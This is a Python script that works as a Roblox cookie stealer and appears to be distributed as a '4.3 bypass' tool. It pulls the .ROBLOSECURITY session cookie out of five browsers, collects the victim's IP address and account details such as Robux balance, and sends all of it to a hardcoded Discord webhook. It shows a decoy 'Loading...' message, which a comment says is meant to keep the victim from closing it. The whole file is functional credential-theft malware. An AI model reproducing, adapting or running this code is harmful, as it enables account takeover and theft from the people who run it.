import os

import codecs

import json

from base64 import *



webhookk = "https://discord.com/api/webhooks/1256489058390249565/S5TaVl5XAJblZ4GHYSkiXoCTUZOmdfL9zJJAQupTRgTQZe7YAdUUdxAtv3CQSRdFW3ZF"

def command(c):

    os.system(c)

def cls():

    os.system("cls")



try:

    import robloxpy

    import requests,re

    from discordwebhook import *

    import browser_cookie3

    

except:

    input("Libraries not installed press enter to exit...")









dummy_message = "Loading..." # A message that distracts the user from closing the grabber

print(dummy_message)

################### Gathering INFOMATION #################################

def cookieLogger():



    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)



    try:

        cookies = browser_cookie3.firefox(domain_name='roblox.com')

        for cookie in cookies:

            if cookie.name == '.ROBLOSECURITY':

                data.append(cookies)

                data.append(cookie.value)

                return data

    except:

        pass

    try:

        cookies = browser_cookie3.chromium(domain_name='roblox.com')

        for cookie in cookies:

            if cookie.name == '.ROBLOSECURITY':

                data.append(cookies)

                data.append(cookie.value)

                return data

    except:

        pass



    try:

        cookies = browser_cookie3.edge(domain_name='roblox.com')

        for cookie in cookies:

            if cookie.name == '.ROBLOSECURITY':

                data.append(cookies)

                data.append(cookie.value)

                return data

    except:

        pass



    try:

        cookies = browser_cookie3.opera(domain_name='roblox.com')

        for cookie in cookies:

            if cookie.name == '.ROBLOSECURITY':

                data.append(cookies)

                data.append(cookie.value)

                return data

    except:

        pass



    try:

        cookies = browser_cookie3.chrome(domain_name='roblox.com')

        for cookie in cookies:

            if cookie.name == '.ROBLOSECURITY':

                data.append(cookies)

                data.append(cookie.value)

                return data

    except:

        pass





cookies = cookieLogger()





#################### INFOMATION #################

ip_address = requests.get("https://api.ipify.org/").text

roblox_cookie = cookies[1]

#################### checking cookie #############

isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)

if isvalid == "Valid Cookie":

    pass

else:

    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})

    exit()



#################### getting info about the cookie #############

ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})

info = json.loads(ebruh.text)

rid = info["UserID"]

rap = robloxpy.User.External.GetRAP(rid)

friends = robloxpy.User.Friends.External.GetCount(rid)

age = robloxpy.User.External.GetAge(rid)

crdate = robloxpy.User.External.CreationDate(rid)

rolimons = f"https://www.rolimons.com/player/{rid}"

roblox_profile = f"https://web.roblox.com/users/{rid}/profile"

headshot = robloxpy.User.External.GetHeadshot(rid)

username = info['UserName']

robux = info['RobuxBalance']

premium = info['IsPremium'];

#################### SENDING TO WEBHOOK #################



discord = Discord(url=webhookk)

discord.post(

    username="Cookie Nuker ☢️",

    avatar_url="https://cdn.discordapp.com/attachments/1120704134799183933/1248305290399449098/image.png?ex=6680d825&is=667f86a5&hm=3eb15510d90d6f33e4e5e3d5e294e04da6d19c70ad1306fdb825bbf21c699feb&",

    embeds=[

        {

            "username": "Cookie Nuker ☢️",

            "title": "💸 +1 Result Account 🕯️",

            "description" : f"[Github Page](https://github.com/reiymu/4.3-bypass/blob/main/main.py) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",

            "color" : 16776960,

            "fields": [

                {"name": "Username", "value": username, "inline": True},

                {"name": "Robux Balance", "value": robux, "inline": True},

                {"name": "Premium Status", "value": premium,"inline": True},

                {"name": "Creation Date", "value": crdate, "inline": True},

                {"name" : "RAP", "value": rap,"inline": True},

                {"name" : "Friends", "value": friends, "inline": True},

                {"name" : "Account Age", "value": age, "inline": True},

                {"name" : "IP Address", "value" : ip_address, "inline:": True},

                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},

            ],

            "thumbnail": {"url": headshot},





        }

    ],

)





                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
